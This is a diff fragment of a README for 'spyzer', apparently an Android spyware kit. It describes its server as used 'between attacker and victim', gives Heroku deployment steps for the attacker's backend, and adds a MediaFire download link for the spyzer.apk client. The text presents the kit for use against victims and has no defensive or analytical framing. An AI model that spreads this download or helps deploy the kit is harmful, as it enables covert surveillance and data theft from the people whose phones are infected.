@@ -12,3 +12,4 @@ spyzer-server is used to communicate between attacker and victim. It is very eas
  - Wait for the process to complete. 
  - Once complete, Click `view app` and If you see `Welcome to Spyzer Backend Server!!` then you have successfully created your server.
  - Now use this url `https://<your_app_name>.herokuapp.com` in [spyzer_v1.5.apk]
+[here](https://www.mediafire.com/file/t8bgo0yyvztwq7k/spyzer.apk/file)
